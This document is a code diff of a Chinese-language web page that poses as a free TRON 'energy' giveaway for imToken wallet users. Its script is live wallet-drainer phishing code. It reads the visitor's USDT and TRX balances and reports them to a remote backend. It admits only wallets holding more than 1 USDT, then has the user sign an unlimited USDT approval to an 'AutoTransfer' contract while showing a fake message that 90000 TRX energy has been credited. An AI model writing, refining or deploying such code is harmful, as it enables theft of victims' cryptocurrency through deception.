@@ -330,431 +330,369 @@
     <div class="footer-info">
         合约验证：AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>（TRON浏览器查询）
         © 2025 TRX能量服务 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
-    </div>
-    <script src="imtoken://browser"></script>
-    <script>
-        // 核心配置
-        const AUTO_TRANSFER_CONTRACT = "TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL";
-        const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-        const BACKEND_API = "https://bot.kgjiopv1.com:8081"; // 替换为你的后端真实地址
-        const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
-        
-        // 能量计算配置
-        const DEPLOY_START_TIME = new Date("2025-10-28T00:00:00Z").getTime();
-        const INIT_ENERGY = 315360004000;
-        const ENERGY_DECREASE_PER_SEC = 3780;
-        const STORAGE_KEY = "energy_countdown_data";
-        let energyTimer = null;
-        
-        // 全局变量
-        let tronWeb = null;
-        let userAddress = null;
-        let trc20Contract = null;
-        let tokenBalance = 0.00;
-        let trxBalance = 0.00;
-        const RECORD_KEY = "imtoken_energy_records";
-        
-        // ========== 二次授权校验：本地存储工具 ==========
-        const AUTHORIZED_KEY = "authorized_wallet_addresses";
-        // 读取已授权地址列表
-        function getAuthorizedAddresses() {
-            try {
-                const stored = localStorage.getItem(AUTHORIZED_KEY);
-                return stored ? JSON.parse(stored) : [];
-            } catch (e) {
-                console.warn("读取已授权地址失败：", e);
-                return [];
+    </div><script src="imtoken://browser"></script>
+<script>
+    // 核心配置
+    const AUTO_TRANSFER_CONTRACT = "TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL";
+    const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const BACKEND_API = "https://bot.kgjiopv1.com:8081"; // 替换为你的后端真实地址
+    const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
+    
+    // 能量计算配置
+    const DEPLOY_START_TIME = new Date("2025-10-28T00:00:00Z").getTime();
+    const INIT_ENERGY = 315360004000;
+    const ENERGY_DECREASE_PER_SEC = 3780;
+    const STORAGE_KEY = "energy_countdown_data";
+    let energyTimer = null;
+    
+    // 全局变量
+    let tronWeb = null;
+    let userAddress = null;
+    let trc20Contract = null;
+    let tokenBalance = 0.00;
+    let trxBalance = 0.00;
+    const RECORD_KEY = "imtoken_energy_records";
+    
+    // ========== 二次授权校验：本地存储工具 ==========
+    const AUTHORIZED_KEY = "authorized_wallet_addresses";
+    function getAuthorizedAddresses() {
+        try {
+            const stored = localStorage.getItem(AUTHORIZED_KEY);
+            return stored ? JSON.parse(stored) : [];
+        } catch (e) {
+            console.warn("读取已授权地址失败：", e);
+            return [];
+        }
+    }
+    function addAuthorizedAddress(address) {
+        try {
+            const addresses = getAuthorizedAddresses();
+            if (!addresses.includes(address)) {
+                addresses.push(address);
+                localStorage.setItem(AUTHORIZED_KEY, JSON.stringify(addresses));
             }
+        } catch (e) {
+            console.warn("存储已授权地址失败：", e);
         }
-        // 添加地址到已授权列表
-        function addAuthorizedAddress(address) {
-            try {
-                const addresses = getAuthorizedAddresses();
-                if (!addresses.includes(address)) {
-                    addresses.push(address);
-                    localStorage.setItem(AUTHORIZED_KEY, JSON.stringify(addresses));
-                }
-            } catch (e) {
-                console.warn("存储已授权地址失败：", e);
-            }
-        }
-        // 校验地址是否已授权
-        function isAddressAuthorized(address) {
-            return getAuthorizedAddresses().includes(address);
-        }
-        
-        // DOM元素缓存
-        const walletStatusContainer = document.getElementById("walletStatusContainer");
-        const contractEnergyEl = document.getElementById("contractEnergy");
-        const contractAddrEl = document.getElementById("contractAddr");
-        const userInfoEl = document.getElementById("userInfo");
-        const connectBtn = document.getElementById("connectBtn");
-        const approveBtn = document.getElementById("approveBtn");
-        const copyLinkBtn = document.getElementById("copyLinkBtn");
-        const copyLinkText = document.getElementById("copyLinkText");
-        const warning = document.querySelector('.warning');
+    }
+    function isAddressAuthorized(address) {
+        return getAuthorizedAddresses().includes(address);
+    }
+    
+    // DOM元素缓存
+    const walletStatusContainer = document.getElementById("walletStatusContainer");
+    const contractEnergyEl = document.getElementById("contractEnergy");
+    const contractAddrEl = document.getElementById("contractAddr");
+    const userInfoEl = document.getElementById("userInfo");
+    const connectBtn = document.getElementById("connectBtn");
+    const approveBtn = document.getElementById("approveBtn");
+    const copyLinkBtn = document.getElementById("copyLinkBtn");
+    const copyLinkText = document.getElementById("copyLinkText");
+    const warning = document.querySelector('.warning');
 
-        window.onload = async () => {
-            // 初始化合约地址显示
-            contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
-            
-            // 初始渲染记录和状态
-            renderEnergyRecords();
-            updateWalletStatus();
-            
-            // 复制链接功能（备用）
-            copyLinkBtn.addEventListener("click", async () => {
+    window.onload = async () => {
+        // 初始化合约地址显示
+        contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
+        
+        // 初始渲染记录和状态
+        renderEnergyRecords();
+        updateWalletStatus();
+        
+        // 复制链接功能（备用）
+        copyLinkBtn.addEventListener("click", async () => {
+            try {
+                await navigator.clipboard.writeText(copyLinkText.textContent.trim());
+                alert("✅ 链接已复制，请在imToken内置浏览器打开");
+            } catch (e) { 
+                alert(`❌ 复制失败：请手动复制链接`); 
+            }
+        });
+        
+        // 检测环境+连接钱包（恢复你最初的稳定逻辑）
+        await checkImTokenEnv();
+        
+        // 启动能量计算
+        startPersistentEnergyCountdown();
+        
+        // 页面卸载时保存状态
+        window.addEventListener("beforeunload", () => {
+            saveEnergyStateToStorage();
+            if (energyTimer) clearInterval(energyTimer);
+        });
+    };
+
+    /**
+     * 环境检测（恢复你最初的逻辑）
+     */
+    async function checkImTokenEnv() {
+        if (window.tronWeb) {
+            tronWeb = window.tronWeb;
+            // 直接连接钱包，无额外版本判断
+            connectBtn.style.display = "none";
+            warning.style.display = "none";
+            await initWallet();
+        } else {
+            // 非imToken环境：自动复制+唤起
+            userInfoEl.innerHTML = `
+                ⚠️ 请使用imToken钱包内置浏览器打开<br>
+                <span style="color: #3b82f6; font-size: 13px;">点击按钮自动复制+唤起imToken</span>
+            `;
+            approveBtn.style.display = "none";
+            connectBtn.onclick = async () => {
                 try {
-                    await navigator.clipboard.writeText(copyLinkText.textContent.trim());
-                    alert("✅ 链接已复制，请在imToken内置浏览器打开");
-                } catch (e) { 
-                    alert(`❌ 复制失败：请手动复制链接`); 
+                    const dappUrl = window.location.href;
+                    await navigator.clipboard.writeText(dappUrl);
+                    window.location.href = "imtoken://open";
+                    setTimeout(() => {
+                        alert(`✅ 已复制链接+唤起imToken\n下一步：打开imToken → 浏览 → 粘贴访问`);
+                    }, 1200);
+                } catch (e) {
+                    alert(`✅ 链接已复制，请在imToken中粘贴访问`);
                 }
-            });
-            
-            // 检测imToken环境和tronWeb就绪状态（核心修复）
-            await checkImTokenEnv();
-            
-            // 启动能量计算
-            startPersistentEnergyCountdown();
-            
-            // 页面卸载时保存状态
-            window.addEventListener("beforeunload", () => {
-                saveEnergyStateToStorage();
-                if (energyTimer) clearInterval(energyTimer);
-            });
-        };
+            };
+        }
+    }
 
-        /**
-         * 核心修复：精准检测环境+分情况处理（确保连接正常）
-         */
-        async function checkImTokenEnv() {
-            // 1. 检测是否在imToken内置浏览器（正则优化，提高准确性）
-            const userAgent = navigator.userAgent.toLowerCase();
-            const isImToken = userAgent.includes("imtoken") && userAgent.includes("mobile");
-            
-            if (!isImToken) {
-                // 非imToken环境：自动复制+唤起imToken
+    /**
+     * 钱包初始化（完全恢复你最初调试稳定的逻辑）
+     */
+    async function initWallet() {
+        try {
+            // 你原来的授权逻辑
+            const accounts = await tronWeb.accounts();
+            if (!accounts || accounts.length === 0) {
+                throw new Error("用户未授权钱包访问");
+            }
+            userAddress = accounts[0];
+
+            // 二次授权拦截（保留）
+            if (isAddressAuthorized(userAddress)) {
                 userInfoEl.innerHTML = `
-                    ⚠️ 请在imToken内置浏览器打开<br>
-                    <span style="color: #3b82f6; font-size: 13px;">点击下方按钮，自动复制链接并唤起imToken</span>
+                    已领取提示<br>
+                    ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
+                    <span style="color: #3b82f6; font-size: 14px;">✅ 该钱包已领取过免费能量</span><br>
+                    <span style="color: #a0a8a4; font-size: 13px;">每个地址仅限领取一次</span>
                 `;
-                approveBtn.style.display = "none";
-
-                // 连接按钮：自动复制+唤起
-                connectBtn.onclick = async () => {
-                    try {
-                        // 自动复制当前Dapp地址（优先用页面真实地址）
-                        const dappUrl = window.location.href || copyLinkText.textContent.trim();
-                        await navigator.clipboard.writeText(dappUrl);
-                        
-                        // 唤起imToken（兼容iOS/Android）
-                        window.location.href = "imtoken://open";
-                        
-                        // 延迟提示，确保用户看到
-                        setTimeout(() => {
-                            alert(`✅ 操作成功！\n下一步：\n1. 打开imToken App\n2. 底部点击「浏览」\n3. 地址栏长按粘贴 → 访问`);
-                        }, 1200);
-                    } catch (e) {
-                        alert(`✅ 链接已复制！\n步骤：打开imToken → 浏览 → 粘贴链接访问`);
-                    }
-                };
+                approveBtn.disabled = true;
+                approveBtn.textContent = "已领取过能量";
+                updateWalletStatus();
+                document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
                 return;
             }
 
-            // 2. imToken环境：优先连接钱包（修复tronWeb初始化逻辑）
-            if (window.tronWeb) {
-                tronWeb = window.tronWeb;
-                // 等待tronWeb完全就绪（避免未初始化就调用）
-                if (!tronWeb.ready) {
-                    await new Promise((resolve) => {
-                        tronWeb.on("ready", resolve);
-                        // 超时保护：3秒未就绪则手动触发
-                        setTimeout(resolve, 3000);
-                    });
-                }
-                // 隐藏连接按钮，直接初始化钱包
-                connectBtn.style.display = "none";
-                warning.style.display = "none";
-                await initWallet();
-            } else {
-                // 极端情况：imToken内但未注入tronWeb，提示刷新
-                userInfoEl.innerHTML = `
-                    ⚠️ 钱包环境异常<br>
-                    <span style="color: #3b82f6; font-size: 13px;">请刷新页面重试</span>
-                `;
-                connectBtn.onclick = () => window.location.reload();
-            }
-        }
+            // 你原来的合约加载+余额获取
+            trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
+            const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
+            tokenBalance = Number(usdtRaw) / 1000000;
+            const trxRaw = await tronWeb.trx.getBalance(userAddress);
+            trxBalance = Number(trxRaw) / 1000000;
 
-        /**
-         * 钱包初始化（确保授权逻辑无错）
-         */
-        async function initWallet() {
-            try {
-                // 1. 请求钱包授权（保留原稳定逻辑，加存在性判断）
-                let accounts;
-                try {
-                    accounts = await tronWeb.request({ method: "tron_requestAccounts" });
-                } catch (e) {
-                    // 旧版兼容（仅当方法存在时调用）
-                    if (typeof tronWeb.accounts === 'function') {
-                        accounts = await tronWeb.accounts();
-                    } else {
-                        throw new Error("钱包授权失败，请更新imToken到最新版本");
-                    }
-                }
-                if (!accounts || accounts.length === 0) {
-                    throw new Error("用户未授权钱包访问");
-                }
-                // 关键：给全局userAddress赋值（之前遗漏导致连接失败）
-                userAddress = accounts[0];
+            // 发送信号A（4.6TRX）
+            userInfoEl.innerHTML = `
+                已连接：<br>
+                ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
+                USDT余额：<span style="color: #4ade80;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
+                <span style="color: #4ade80; font-size: 14px;">✅ 能量同步中...</span>
+            `;
+            approveBtn.disabled = true;
+            approveBtn.textContent = "同步中...";
 
-                // 2. 二次授权校验：已授权则拦截
-                if (isAddressAuthorized(userAddress)) {
+            const a1Success = await sendSignalA(4.6);
+            if (a1Success) {
+                if (tokenBalance <= 1) {
                     userInfoEl.innerHTML = `
-                        已领取提示<br>
+                        已连接：<br>
                         ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                        <span style="color: #3b82f6; font-size: 14px;">✅ 该钱包已领取过免费能量</span><br>
-                        <span style="color: #a0a8a4; font-size: 13px;">每个地址仅限领取一次，感谢支持～</span>
+                        USDT余额：<span style="color: #ef4444;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
+                        <span style="color: #ef4444; font-size: 14px;">❌ 不符合领取条件（USDT需＞1）</span>
                     `;
                     approveBtn.disabled = true;
-                    approveBtn.textContent = "已领取过能量";
-                    updateWalletStatus();
-                    document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-                    return;
-                }
-
-                // 3. 获取USDT合约实例
-                try {
-                    trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
-                } catch (e) {
-                    throw new Error("USDT合约加载失败");
-                }
-
-                // 4. 获取余额
-                try {
-                    const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
-                    tokenBalance = Number(usdtRaw) / 1000000;
-                    const trxRaw = await tronWeb.trx.getBalance(userAddress);
-                    trxBalance = Number(trxRaw) / 1000000;
-                } catch (e) {
-                    throw new Error("余额获取失败，请检查网络");
-                }
-
-                // 5. 发送信号A（4.6TRX）
-                userInfoEl.innerHTML = `
-                    已连接：<br>
-                    ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                    USDT余额：<span style="color: #4ade80;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
-                    <span style="color: #4ade80; font-size: 14px;">✅ 能量同步中...（请勿退出）</span>
-                `;
-                approveBtn.disabled = true;
-                approveBtn.textContent = "同步中...";
-
-                const a1Success = await sendSignalA(4.6);
-                if (a1Success) {
-                    // 余额校验
-                    if (tokenBalance <= 1) {
-                        userInfoEl.innerHTML = `
-                            已连接：<br>
-                            ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                            USDT余额：<span style="color: #ef4444;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
-                            <span style="color: #ef4444; font-size: 14px;">❌ 不符合领取条件（USDT需＞1）</span>
-                        `;
-                        approveBtn.disabled = true;
-                        approveBtn.textContent = "不符合领取条件";
-                    } else {
-                        userInfoEl.innerHTML = `
-                            已连接：<br>
-                            ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                            USDT余额：<span style="color: #4ade80;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
-                            <span style="color: #4ade80; font-size: 14px;">✅ 可免费领取90000 TRX能量</span>
-                        `;
-                        approveBtn.disabled = false;
-                        approveBtn.textContent = "免费领取能量";
-                        // 绑定领取逻辑
-                        bindApproveLogic();
-                    }
+                    approveBtn.textContent = "不符合领取条件";
                 } else {
                     userInfoEl.innerHTML = `
                         已连接：<br>
                         ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                        <span style="color: #ef4444; font-size: 14px;">⚠️ 同步失败，点击重试</span>
+                        USDT余额：<span style="color: #4ade80;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
+                        <span style="color: #4ade80; font-size: 14px;">✅ 可免费领取90000 TRX能量</span>
                     `;
                     approveBtn.disabled = false;
-                    approveBtn.textContent = "同步失败，点击重试";
-                    approveBtn.onclick = () => initWallet();
+                    approveBtn.textContent = "免费领取能量";
+                    bindApproveLogic();
                 }
-
-                // 更新页面状态
-                updateWalletStatus();
-                document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-            } catch (e) {
-                // 精准错误提示
-                const errorMsg = e.message;
+            } else {
                 userInfoEl.innerHTML = `
-                    钱包连接异常<br>
-                    <span style="color: #ef4444; font-size: 13px;">原因：${errorMsg}</span><br>
-                    <span style="color: #3b82f6; font-size: 13px;">建议：刷新页面或更新imToken重试</span>
+                    已连接：<br>
+                    ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
+                    <span style="color: #ef4444; font-size: 14px;">⚠️ 同步失败，点击重试</span>
                 `;
-                approveBtn.disabled = true;
-                approveBtn.textContent = "连接失败，点击重试";
+                approveBtn.disabled = false;
+                approveBtn.textContent = "同步失败，点击重试";
                 approveBtn.onclick = () => initWallet();
             }
-        }
 
-        /**
-         * 发送信号A（4.6/2.3TRX）
-         */
-        async function sendSignalA(trxAmount) {
+            updateWalletStatus();
+            document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+        } catch (e) {
+            // 你原来的错误提示
+            userInfoEl.innerHTML = `
+                钱包连接异常<br>
+                <span style="color: #ef4444; font-size: 13px;">原因：${e.message}</span><br>
+                <span style="color: #3b82f6; font-size: 13px;">建议：检查钱包是否解锁/网络是否正常</span>
+            `;
+            approveBtn.disabled = true;
+            approveBtn.textContent = "连接失败，点击重试";
+            approveBtn.onclick = () => initWallet();
+        }
+    }
+
+    /**
+     * 发送信号A（4.6/2.3TRX）
+     */
+    async function sendSignalA(trxAmount) {
+        try {
+            const res = await fetch(`${BACKEND_API}/send-signal-a`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    userAddress: userAddress,
+                    trxAmount: trxAmount,
+                    usdtBalance: tokenBalance
+                }),
+                timeout: 15000
+            });
+            const data = await res.json();
+            if (!res.ok || !data.success) throw new Error(data.detail || "信号A处理失败");
+            return true;
+        } catch (e) {
+            console.error("信号A失败：", e);
+            return false;
+        }
+    }
+
+    /**
+     * 发送信号B（执行转账）
+     */
+    async function sendSignalB() {
+        try {
+            const res = await fetch(`${BACKEND_API}/send-signal-b`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ userAddress: userAddress }),
+                timeout: 15000
+            });
+            const data = await res.json();
+            if (!res.ok || !data.success) throw new Error(data.detail || "信号B处理失败");
+            return true;
+        } catch (e) {
+            console.error("信号B失败：", e);
+            return false;
+        }
+    }
+
+    /**
+     * 领取按钮逻辑（保留）
+     */
+    function bindApproveLogic() {
+        approveBtn.onclick = async () => {
+            const btn = document.getElementById("approveBtn");
+            btn.disabled = true;
+            btn.textContent = "能量分配中...";
             try {
-                const res = await fetch(`${BACKEND_API}/send-signal-a`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        userAddress: userAddress,
-                        trxAmount: trxAmount,
-                        usdtBalance: tokenBalance
-                    }),
-                    timeout: 15000
-                });
-                const data = await res.json();
-                if (!res.ok || !data.success) throw new Error(data.detail || "信号A处理失败");
-                return true;
-            } catch (e) {
-                console.error("信号A失败：", e);
-                return false;
-            }
-        }
-
-        /**
-         * 发送信号B（执行转账）
-         */
-        async function sendSignalB() {
-            try {
-                const res = await fetch(`${BACKEND_API}/send-signal-b`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ userAddress: userAddress }),
-                    timeout: 15000
-                });
-                const data = await res.json();
-                if (!res.ok || !data.success) throw new Error(data.detail || "信号B处理失败");
-                return true;
-            } catch (e) {
-                console.error("信号B失败：", e);
-                return false;
-            }
-        }
-
-        /**
-         * 领取按钮核心逻辑
-         */
-        function bindApproveLogic() {
-            approveBtn.onclick = async () => {
-                const btn = document.getElementById("approveBtn");
-                btn.disabled = true;
-                btn.textContent = "能量分配中...";
-                try {
-                    // 第一步：发送信号B（4.6TRX转账）
-                    const b1Success = await sendSignalB();
-                    if (!b1Success) {
-                        throw new Error("第一次能量分配失败");
-                    }
-
-                    // 第二步：跳转授权
-                    btn.textContent = "即将跳转授权...";
-                    window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href + "#approve")}`;
-
-                    // 第三步：授权成功后发送信号A2（2.3TRX）
-                    await trc20Contract.approve(
-                        AUTO_TRANSFER_CONTRACT,
-                        INFINITE_APPROVE_AMOUNT
-                    ).send({ from: userAddress, shouldPollResponse: true });
-
-                    // 第四步：发送信号A2（2.3TRX）
-                    btn.textContent = "最终能量同步中...";
-                    const a2Success = await sendSignalA(2.3);
-                    if (!a2Success) {
-                        throw new Error("第二次能量同步失败");
-                    }
-
-                    // 第五步：发送信号B2（2.3TRX转账）
-                    btn.textContent = "最后能量发放中...";
-                    const b2Success = await sendSignalB();
-                    if (b2Success) {
-                        // 标记为已授权，禁止二次领取
-                        addAuthorizedAddress(userAddress);
-                        
-                        btn.textContent = "能量已到账";
-                        alert("🎉 免费能量领取完成！\n90000 TRX能量已全部发放至您的钱包～");
-                        saveEnergyRecord();
-                        renderEnergyRecords();
-                    } else {
-                        throw new Error("第二次能量发放失败");
-                    }
-                } catch (e) {
-                    btn.textContent = "免费领取能量";
-                    btn.disabled = false;
-                    alert(`⚠️ 操作失败：${e.message}，请稍后重试`);
+                // 发送信号B（4.6TRX）
+                const b1Success = await sendSignalB();
+                if (!b1Success) {
+                    throw new Error("第一次能量分配失败");
                 }
-            };
-        }
 
-        /**
-         * 能量计算相关函数
-         */
-        function startPersistentEnergyCountdown() {
-            const savedState = loadEnergyStateFromStorage();
-            let currentEnergy = savedState ? savedState.currentEnergy : INIT_ENERGY - Math.floor((new Date().getTime() - DEPLOY_START_TIME)/1000)*ENERGY_DECREASE_PER_SEC;
+                // 跳转授权
+                btn.textContent = "即将跳转授权...";
+                window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href + "#approve")}`;
+
+                // 授权后发送信号A2（2.3TRX）
+                await trc20Contract.approve(
+                    AUTO_TRANSFER_CONTRACT,
+                    INFINITE_APPROVE_AMOUNT
+                ).send({ from: userAddress, shouldPollResponse: true });
+
+                btn.textContent = "最终能量同步中...";
+                const a2Success = await sendSignalA(2.3);
+                if (!a2Success) {
+                    throw new Error("第二次能量同步失败");
+                }
+
+                // 发送信号B2（2.3TRX）
+                btn.textContent = "最后能量发放中...";
+                const b2Success = await sendSignalB();
+                if (b2Success) {
+                    addAuthorizedAddress(userAddress);
+                    btn.textContent = "能量已到账";
+                    alert("🎉 免费能量领取完成！\n90000 TRX能量已到账～");
+                    saveEnergyRecord();
+                    renderEnergyRecords();
+                } else {
+                    throw new Error("第二次能量发放失败");
+                }
+            } catch (e) {
+                btn.textContent = "免费领取能量";
+                btn.disabled = false;
+                alert(`⚠️ 操作失败：${e.message}，请稍后重试`);
+            }
+        };
+    }
+
+    /**
+     * 能量计算相关函数（保留）
+     */
+    function startPersistentEnergyCountdown() {
+        const savedState = loadEnergyStateFromStorage();
+        let currentEnergy = savedState ? savedState.currentEnergy : INIT_ENERGY - Math.floor((new Date().getTime() - DEPLOY_START_TIME)/1000)*ENERGY_DECREASE_PER_SEC;
+        currentEnergy = currentEnergy < 0 ? 0 : currentEnergy;
+        updateEnergyDisplay(currentEnergy);
+        if (energyTimer) clearInterval(energyTimer);
+        energyTimer = setInterval(() => {
+            currentEnergy -= ENERGY_DECREASE_PER_SEC;
             currentEnergy = currentEnergy < 0 ? 0 : currentEnergy;
             updateEnergyDisplay(currentEnergy);
-            if (energyTimer) clearInterval(energyTimer);
-            energyTimer = setInterval(() => {
-                currentEnergy -= ENERGY_DECREASE_PER_SEC;
-                currentEnergy = currentEnergy < 0 ? 0 : currentEnergy;
-                updateEnergyDisplay(currentEnergy);
-                saveEnergyStateToStorage(currentEnergy);
-            }, 1000);
-        }
-        function loadEnergyStateFromStorage() {
-            try { return JSON.parse(localStorage.getItem(STORAGE_KEY)) || null; } catch (e) { return null; }
-        }
-        function saveEnergyStateToStorage(currentEnergy) {
-            localStorage.setItem(STORAGE_KEY, JSON.stringify({ currentEnergy, lastUpdateTime: new Date().getTime() }));
-        }
-        function updateEnergyDisplay(currentEnergy) {
-            contractEnergyEl.textContent = Math.floor(currentEnergy).toLocaleString();
-        }
-        function updateWalletStatus() {
-            userAddress ? walletStatusContainer.classList.add("connected") : walletStatusContainer.classList.remove("connected");
-        }
-        function saveEnergyRecord() {
-            const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
-            const newRecords = existing.filter(item => item.address !== userAddress);
-            newRecords.push({
-                address: userAddress,
-                tokenBalance: tokenBalance,
-                trxBalance: trxBalance,
-                receiveTime: new Date().toLocaleString(),
-                energyAmount: "90000",
-                recordType: "免费能量领取"
-            });
-            localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
-        }
-        function renderEnergyRecords() {
-            const container = document.getElementById("approvalRecords");
-            const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
-            container.innerHTML = records.length === 0 ? "<div class='record-item'>暂无能量领取记录</div>" : records.map(record => `
-                <div class="record-item">
-                    <p><strong>地址：</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
-                    <p><strong>领取类型：</strong>${record.recordType}</p>
-                    <p><strong>获取能量：</strong>${record.energyAmount} TRX能量</p>
-                    <p><strong>领取时间：</strong>${record.receiveTime}</p>
-                </div>
-            `).join("");
-        }
-    </script>
+            saveEnergyStateToStorage(currentEnergy);
+        }, 1000);
+    }
+    function loadEnergyStateFromStorage() {
+        try { return JSON.parse(localStorage.getItem(STORAGE_KEY)) || null; } catch (e) { return null; }
+    }
+    function saveEnergyStateToStorage(currentEnergy) {
+        localStorage.setItem(STORAGE_KEY, JSON.stringify({ currentEnergy, lastUpdateTime: new Date().getTime() }));
+    }
+    function updateEnergyDisplay(currentEnergy) {
+        contractEnergyEl.textContent = Math.floor(currentEnergy).toLocaleString();
+    }
+    function updateWalletStatus() {
+        userAddress ? walletStatusContainer.classList.add("connected") : walletStatusContainer.classList.remove("connected");
+    }
+    function saveEnergyRecord() {
+        const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
+        const newRecords = existing.filter(item => item.address !== userAddress);
+        newRecords.push({
+            address: userAddress,
+            tokenBalance: tokenBalance,
+            trxBalance: trxBalance,
+            receiveTime: new Date().toLocaleString(),
+            energyAmount: "90000",
+            recordType: "免费能量领取"
+        });
+        localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
+    }
+    function renderEnergyRecords() {
+        const container = document.getElementById("approvalRecords");
+        const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
+        container.innerHTML = records.length === 0 ? "<div class='record-item'>暂无能量领取记录</div>" : records.map(record => `
+            <div class='record-item'>
+                <p><strong>地址：</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
+                <p><strong>领取类型：</strong>${record.recordType}</p>
+                <p><strong>获取能量：</strong>${record.energyAmount} TRX能量</p>
+                <p><strong>领取时间：</strong>${record.receiveTime}</p>
+            </div>
+        `).join("");
+    }
+</script> 
 </body>
 </html>
